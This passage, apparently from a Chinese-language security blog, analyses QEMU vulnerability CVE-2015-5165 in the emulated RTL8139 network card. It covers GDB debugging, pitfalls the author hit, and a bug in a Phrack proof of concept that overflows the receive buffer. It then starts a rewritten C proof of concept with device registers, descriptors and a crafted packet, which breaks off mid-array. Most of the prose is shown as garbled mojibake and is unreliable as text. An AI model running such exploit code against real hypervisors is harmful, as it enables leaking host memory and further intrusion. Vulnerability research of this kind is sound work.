å’Œç¡¬ä»¶æ¥è§¦ä¸å¤šçš„åˆå­¦è€…ï¼ˆæ¯”å¦‚ç¬”è€…è‡ªå·±ï¼‰ï¼Œå»ºè®®å°è¯•ç†è§£æ¯ä¸€è¡Œä»£ç çš„ä½œç”¨ï¼Œé‡åˆ°ä¸æ‡‚çš„æ¦‚å¿µå°± Google ä¸€ä¸‹ï¼Œä»£ç ä¸ Work å°± Debug ä¸€ä¸‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å­¦åˆ°å¾ˆå¤šæ–°çš„çŸ¥è¯†ï¼Œè¿™ä¹Ÿæ­£æ˜¯åˆ†æè¯¥æ¼æ´çš„å‡ºå‘ç‚¹ã€‚</p><p>åœ¨ä¸»æœºä¸­å¯ä»¥é€šè¿‡ GDB é™„åŠ åˆ° QEMU è¿›ç¨‹ <code>qemu-system-x86</code> è¿›è¡Œè°ƒè¯•ï¼Œè§¦å‘æ¼æ´çš„ä½ç½®å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202006/qemu-gdb-debug.png" alt="GDB è°ƒè¯• QEMU æ¼æ´ CVE-2015-5165"></p><p><strong>è°ƒè¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„å‡ ä¸ªå‘ï¼š</strong></p><p><strong>(I)</strong> åœ¨æ„é€ æ•°æ®åŒ…æ—¶ï¼ŒEthernet Frame çš„æº MAC åœ°å€ã€ç›®æ ‡ MAC åœ°å€éœ€è¦å¡«å……ä¸º QEMU è™šæ‹Ÿæœº RTL8139 ç½‘å¡çš„ MAC åœ°å€ï¼Œé€šè¿‡ <code>ifconfig -a</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹æœ¬æœºæ‰€æœ‰ç½‘å¡çš„æ•°æ®ï¼›ç¬”è€…ä¸€å¼€å§‹ä½¿ç”¨çš„ <code>ifconfig</code> å‘½ä»¤ï¼Œç»“æœååæ²¡æœ‰æ‰“å° RTL8139 ç½‘å¡çš„ä¿¡æ¯ï¼Œå¯¼è‡´å¡«å……äº†é”™è¯¯çš„ MAC åœ°å€ï¼Œé€šè¿‡è°ƒè¯• QEMU è¿›ç¨‹æ‰å‘ç° MAC åœ°å€ä¸ä¸€è‡´ï¼›</p><p><strong>(II)</strong> Phrack æ–‡ç«  [1] æä¾›çš„ Exploit ä»£ç ä¸­ <code>rtl8139_tx_desc</code> æ˜¯æ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œå®é™…æµ‹è¯•æ—¶å‘ç°è·å–ä¸åˆ°åœ¨å†…å­˜ä¸­çš„ç‰©ç†åœ°å€ï¼ˆGuest Physical Addressï¼‰ï¼Œæ”¹ä¸ºä»å †ä¸ŠåŠ¨æ€ç”³è¯·å†…å­˜å³å¯ï¼›è°ƒè¯•å‘ç°æ˜¯ç¬”è€…è‡ªå·±å®ç°çš„è·å–ç‰©ç†å†…å­˜åœ°å€çš„ä»£ç æœ‰é—®é¢˜ï¼Œå› ä¸ºæ ˆçš„åœ°å€å¾ˆé«˜ï¼Œè½¬æ¢æˆæœ‰ç¬¦å·æ•°æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨ <code>fseek</code> çš„æ—¶å€™éœ€è¦å¤„ç†å¥½ç¬¦å·é—®é¢˜ï¼Œå¦åˆ™ <code>fseek</code> ä¼šå¤±è´¥ï¼›</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">    &#123;</span><br><span class="line">        pfn &amp;= PFN_PFN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(III)</strong> åœ¨ QEMU è™šæ‹Ÿæœºæµ‹è¯• PoC æ—¶ï¼Œå‘ç°æ‰“å°æ¥æ”¶åˆ°çš„æ•°æ®çš„æ—¶å€™è¿›ç¨‹ Crash äº†ï¼Œä»æ‰“å°å‡ºæ¥çš„è°ƒç”¨æ ˆæ¥çœ‹ï¼Œåº”è¯¥æ˜¯æ¥æ”¶ç¼“å†²åŒºæº¢å‡ºäº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">*** Error in `./a.out': corrupted size vs. prev_size: 0x092975e8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb75af377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb75b52f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6f979)[0xb75b7979]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb75b8fc5]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_doallocate+0x6e)[0xb75a592e]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_doallocbuf+0x47)[0xb75b31c7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_overflow+0x1c1)[0xb75b2561]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_xsputn+0x94)[0xb75b1684]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x193)[0xb758a253]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_printf+0x26)[0xb7591696]</span><br><span class="line">./a.out[0x8048b1e]</span><br><span class="line">./a.out[0x8048c61]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7560637]</span><br><span class="line">./a.out[0x80485b1]</span><br></pre></td></tr></table></figure><p>è°ƒè¯•å‘ç° Phrack æ–‡ç«  [1] æœ«å°¾ç»™å‡ºçš„ä»£ç å­˜åœ¨ä¸€ä¸ª Bugï¼Œè€Œè¿™ä¸ª Bug å±…ç„¶æ²¡æœ‰äººå‘ç°ï¼Œç¬”è€…æœç´¢äº†å›½å†…ç›¸å…³çš„æŠ€æœ¯æ–‡ç« ï¼Œå‘ç°éƒ½ç…§æ¬äº†è¿™ä¸ª Bug ã€‚å…¶ä»–äººæ²¡æœ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç”±äºåˆ†æç¯å¢ƒçš„ä¸åŒæ‰€é€ æˆçš„ï¼š</p><ul><li>ç¬”è€…çš„ QEMU è™šæ‹Ÿæœºä¸­å®‰è£…çš„æ˜¯ Ubuntu å®˜æ–¹å‘è¡Œçš„ Server ç‰ˆæœ¬</li><li>å…¶ä»–æ–‡ç« ä¸­çš„ QEMU è™šæ‹Ÿæœºä¸­å®‰è£…çš„æ˜¯ä¸´æ—¶ç¼–è¯‘çš„ Linux ç³»ç»Ÿ</li></ul><p>å¯¹è¯¥ Bug çš„åˆ†æå¦‚ä¸‹ï¼š</p><ol><li>å‡½æ•° <code>rtl8139_cplus_transmit_one</code> åœ¨å‘é€åˆ†ç‰‡åçš„ Ethernet Frame æ—¶ï¼Œæ•°æ®åŒ…çš„å¤§å°æ˜¯ <code>1514</code> å­—èŠ‚ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">    <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure><ol start="2"><li>å› ä¸ºæ˜¯å‘ç»™æœ¬æœºçš„æ•°æ®ï¼Œæ‰€ä»¥æ‰§è¡Œæµç¨‹ç»ç”± <code>rtl8139_transfer_frame</code> è¿›å…¥ <code>rtl8139_do_receive</code> ï¼Œè¿™é‡Œä¼šæ£€æŸ¥æ¥æ”¶ç¼“å†²åŒºæ˜¯å¦è¿˜æœ‰å¤šä½™çš„ <code>4</code> å­—èŠ‚ç©ºé—´ç”¨äºå¡«å…… Checksum ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %d + 4\n"</span>,</span><br><span class="line">        descriptor, rx_space, size);</span><br><span class="line">    <span class="comment">// error handling ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* receive/copy to target memory */</span></span><br><span class="line"><span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="comment">/* write checksum */</span></span><br><span class="line">val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>Phrack æ–‡ç«  [1] å¯¹æ¥æ”¶ç¼“å†²åŒºçš„è®¾ç½®ä½äºå‡½æ•° <code>rtl8139_desc_config_rx</code> ï¼Œå¯ä»¥æ¯ä¸€ä¸ª <code>ring / descriptor</code> å…³è”çš„ç¼“å†²åŒºçš„å¤§å°æ˜¯ <code>RTL8139_BUFFER_SIZE</code> å³ <code>1514</code> å­—èŠ‚ï¼Œä½†æ˜¯ <code>dw0</code> æ ‡å¿—ä¸­è®¾ç½®çš„å¤§å°å´æ˜¯ <code>USHRT_MAX</code> å³ <code>65535</code> ï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(struct rtl8139_ring *ring,</span></span></span><br><span class="line"><span class="function"><span class="params">                            struct rtl8139_desc *desc, <span class="keyword">int</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nb; i++) &#123;</span><br><span class="line">ring[i].desc = &amp;desc[i];</span><br><span class="line"><span class="built_in">memset</span>(ring[i].desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, RTL8139_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line"></span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line"><span class="keyword">if</span> (i == nb - <span class="number">1</span>)</span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_EOR;</span><br><span class="line">ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">ring[i].desc-&gt;dw0 |= USHRT_MAX;</span><br><span class="line">ring[i].desc-&gt;buf_lo = addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(desc);</span><br><span class="line">outl(addr, RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">outl(<span class="number">0x0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>è¿™æ ·çš„è®¾ç½®æ˜¾ç„¶æ˜¯ä¸å¯¹çš„ï¼Œè¿™ä¼šå¯¼è‡´å¯ä»¥é€šè¿‡å‡½æ•° <code>rtl8139_do_receive</code> ä¸­çš„ç¼“å†²åŒºå¤§å°æ£€æŸ¥ï¼Œåé¢åœ¨å†™å…¥ Checksum æ—¶ä¼šå¯¼è‡´å †å—è¶Šç•Œå†™ï¼Œè¿™å°±æ˜¯å¯¼è‡´ QEMU è™šæ‹Ÿæœºä¸­ PoC è¿›ç¨‹ Crash çš„åŸå› ï¼›</li></ol><p>å‚è€ƒ Phrack æ–‡ç« çš„ä»£ç ï¼Œç¬”è€…é‡å†™çš„ä¸€ä»½ç”¨äºæµ‹è¯• CVE-2015-5165 çš„å®Œæ•´ PoC ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é¡µé¢ç›¸å…³å‚æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame å¤§å°</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡ PMIO åœ°å€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask è¡¨ç¤º 0 ~ 12 ä½ä¸º buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡å¯„å­˜å™¨åç§»åœ°å€</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// è™½ç„¶åå­—å†™çš„ RxRingAddr, ä½†å®é™…ä¸Šæ˜¯ Rx descriptor çš„åœ°å€</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header æ•°æ®</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span 